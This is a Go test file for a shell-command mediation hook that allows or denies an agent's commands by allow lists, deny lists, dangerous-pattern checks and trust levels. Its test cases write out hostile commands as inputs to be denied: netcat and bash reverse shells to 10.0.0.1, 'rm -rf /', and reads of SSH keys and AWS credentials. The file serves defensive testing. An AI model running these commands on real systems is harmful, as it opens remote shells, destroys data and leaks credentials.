// Copyright (c) CapiscIO, Inc.
// Licensed under the MIT License.

package mediation

import (
	"context"
	"testing"

	"github.com/capiscio/capiscio-core/v2/pkg/badge"
)

func TestShellHook_Mediate(t *testing.T) {
	manager := newMockMaterialManager()

	// Create a context with a valid badge for "allow" tests
	mctxWithBadge := &Context{
		TrustMaterial: manager,
		Badge: &badge.Claims{
			Subject: "did:web:agent.example.com",
			Issuer:  "https://registry.capiscio.com",
			IAL:     "2",
		},
		SubjectDID: "did:web:agent.example.com",
		TrustLevel: 2,
	}

	tests := []struct {
		name         string
		config       ShellHookConfig
		command      string
		useBadge     bool
		wantDecision Decision
	}{
		{
			name: "allowed command - explicit",
			config: ShellHookConfig{
				AllowedCommands: []string{"ls", "cat", "grep"},
			},
			command:      "ls -la /tmp",
			useBadge:     true,
			wantDecision: DecisionAllow,
		},
		{
			name: "denied command - dangerous rm -rf",
			config: ShellHookConfig{
				AllowedCommands: []string{"*"},
			},
			command:      "rm -rf /",
			useBadge:     true,
			wantDecision: DecisionDeny,
		},
		{
			name: "denied command - sudo",
			config: ShellHookConfig{
				AllowedCommands: []string{"*"},
			},
			command:      "sudo rm -rf /tmp/test",
			useBadge:     true,
			wantDecision: DecisionDeny,
		},
		{
			name: "denied command - reverse shell nc",
			config: ShellHookConfig{
				AllowedCommands: []string{"*"},
			},
			command:      "nc -e /bin/sh 10.0.0.1 4444",
			useBadge:     true,
			wantDecision: DecisionDeny,
		},
		{
			name: "denied command - bash reverse shell",
			config: ShellHookConfig{
				AllowedCommands: []string{"*"},
			},
			command:      "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			useBadge:     true,
			wantDecision: DecisionDeny,
		},
		{
			name: "denied command - cat ssh key",
			config: ShellHookConfig{
				AllowedCommands: []string{"*"},
			},
			command:      "cat ~/.ssh/id_rsa",
			useBadge:     true,
			wantDecision: DecisionDeny,
		},
		{
			name: "denied command - explicit deny list",
			config: ShellHookConfig{
				AllowedCommands: []string{"*"},
				DeniedCommands:  []string{"wget"},
			},
			command:      "wget http://example.com/file",
			useBadge:     true,
			wantDecision: DecisionDeny,
		},
		{
			name: "default deny - no match",
			config: ShellHookConfig{
				AllowedCommands: []string{"ls", "cat"},
				DefaultDeny:     true,
			},
			command:      "grep pattern file.txt",
			useBadge:     true,
			wantDecision: DecisionDeny,
		},
		{
			name: "wildcard allow with safe command",
			config: ShellHookConfig{
				AllowedCommands: []string{"*"},
			},
			command:      "echo hello world",
			useBadge:     true,
			wantDecision: DecisionAllow,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			hook := NewShellHook(tt.config)

			var mctx *Context
			if tt.useBadge {
				mctx = mctxWithBadge
			} else {
				mctx = NewContext(manager, nil, nil)
			}

			req := &ShellRequest{
				Command: tt.command,
			}

			result, err := hook.Mediate(context.Background(), mctx, req)
			if err != nil {
				t.Fatalf("Mediate() error = %v", err)
			}

			if result.Decision != tt.wantDecision {
				t.Errorf("Mediate() decision = %v, want %v (reason: %s)",
					result.Decision, tt.wantDecision, result.Reason)
			}
		})
	}
}

// TestShellHook_DangerousPatternDetection tests that dangerous patterns are denied.
// Tests via the public Mediate interface.
func TestShellHook_DangerousPatternDetection(t *testing.T) {
	manager := newMockMaterialManager()

	// Create a context with a valid badge to isolate pattern testing
	mctxWithBadge := &Context{
		TrustMaterial: manager,
		Badge: &badge.Claims{
			Subject: "did:web:agent.example.com",
			Issuer:  "https://registry.capiscio.com",
			IAL:     "2",
		},
		SubjectDID: "did:web:agent.example.com",
		TrustLevel: 2,
	}

	tests := []struct {
		name        string
		command     string
		wantDeny    bool
	}{
		{"rm -rf /", "rm -rf /", true},
		{"sudo prefix", "sudo apt update", true},
		{"chmod 777", "chmod 777 /tmp/file", true},
		{"nc reverse shell", "nc -e /bin/bash 10.0.0.1 4444", true},
		{"safe echo", "echo hello", false},
		{"safe ls", "ls -la", false},
		{"ssh key access", "cat ~/.ssh/id_rsa", true},
		{"aws creds", "cat ~/.aws/credentials", true},
	}

	hook := NewShellHook(ShellHookConfig{
		AllowedCommands: []string{"*"}, // Allow all to isolate dangerous pattern testing
	})

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := &ShellRequest{Command: tt.command}

			result, err := hook.Mediate(context.Background(), mctxWithBadge, req)
			if err != nil {
				t.Fatalf("Mediate() error = %v", err)
			}

			gotDeny := result.Decision == DecisionDeny
			if gotDeny != tt.wantDeny {
				t.Errorf("command %q: got deny=%v, want deny=%v (reason: %s)",
					tt.command, gotDeny, tt.wantDeny, result.Reason)
			}
		})
	}
}

func TestShellHook_NoTrustMaterial(t *testing.T) {
	hook := NewShellHook(ShellHookConfig{
		AllowedCommands: []string{"*"},
	})

	// Create context WITHOUT trust material
	mctx := NewContext(nil, nil, nil)

	req := &ShellRequest{
		Command: "echo hello",
	}

	result, err := hook.Mediate(context.Background(), mctx, req)
	if err != nil {
		t.Fatalf("Mediate() error = %v", err)
	}

	// Should deny due to no trust material
	if result.Decision != DecisionDeny {
		t.Errorf("Expected deny for no trust material, got %v", result.Decision)
	}
}

func TestShellHook_MinTrustLevel(t *testing.T) {
	manager := newMockMaterialManager()

	hook := NewShellHook(ShellHookConfig{
		AllowedCommands: []string{"*"},
		MinTrustLevel:   3, // Require IAL-3
	})

	// Create context with manager but no badge (TrustLevel = 0)
	mctx := NewContext(manager, nil, nil)

	req := &ShellRequest{
		Command: "echo hello",
	}

	result, err := hook.Mediate(context.Background(), mctx, req)
	if err != nil {
		t.Fatalf("Mediate() error = %v", err)
	}

	// Should deny due to insufficient trust level
	if result.Decision != DecisionDeny {
		t.Errorf("Expected deny for insufficient trust level, got %v", result.Decision)
	}
}
